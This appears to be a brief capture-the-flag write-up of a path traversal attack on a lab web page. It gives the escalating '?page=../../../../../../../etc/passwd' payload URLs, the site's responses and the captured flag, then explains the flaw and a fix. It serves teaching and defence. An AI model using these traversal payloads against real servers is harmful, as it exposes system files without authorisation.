When trying to access the page http://192.168.1.32/?page=/etc/passwd, the website send an alert saying:
"Wrong.."

We can try to access in previous directory using "../"

This way, when trying with multiple "previous directory" instructions http://192.168.1.32/?page=../../../etc/passwd
The website send "Nope.." this time.

So we tried with many more http://192.168.1.32/?page=../../../../../../../etc/passwd
And the website sent "Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0"

A directory traversal (or path traversal) attack exploits insufficient security validation or sanitization of user-supplied file names, such that characters representing "traverse to parent directory" are passed through to the operating system's file system API. An affected application can be exploited to gain unauthorized access to the file system.

To fix this vulnerability, use a Secure File Access Methods to avoid directly using user-supplied input in file system paths. Instead, map user inputs to a predefined set of file paths stored securely on the server. This way, even if a user attempts to perform directory traversal, they will not be able to access unauthorized files because the input is mapped to safe, predetermined file locations.